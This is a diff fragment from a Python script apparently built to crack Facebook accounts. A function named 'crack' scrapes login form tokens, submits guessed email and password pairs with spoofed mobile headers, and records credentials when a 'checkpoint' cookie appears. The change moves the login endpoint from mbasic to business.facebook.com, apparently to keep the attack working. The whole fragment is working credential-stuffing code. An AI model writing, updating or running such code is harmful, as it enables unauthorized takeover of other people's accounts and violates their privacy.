@@ -626,7 +626,7 @@ def crack(idf,pwx,url,time_xx):
 			get_method = ses.get(f"https://m.facebook.com/").text
 			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(get_method)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(get_method)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(get_method)).group(1), 'li': re.search('name="li" value="(.*?)"',str(get_method)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(get_method)).group(1)}
 			head = ({"Host": url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com/","content-type":"application/x-www-form-urlencoded","user-agent":f"{uai2}","accept":"*/*","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"manifest","referer":f"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-			post_method = ses.post(f"https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101",data=date, headers=head)
+			post_method = ses.post(f"https://business.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101",data=date, headers=head)
 			if "checkpoint" in ses.cookies.get_dict():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				data = (f'{idf}|{pw}')
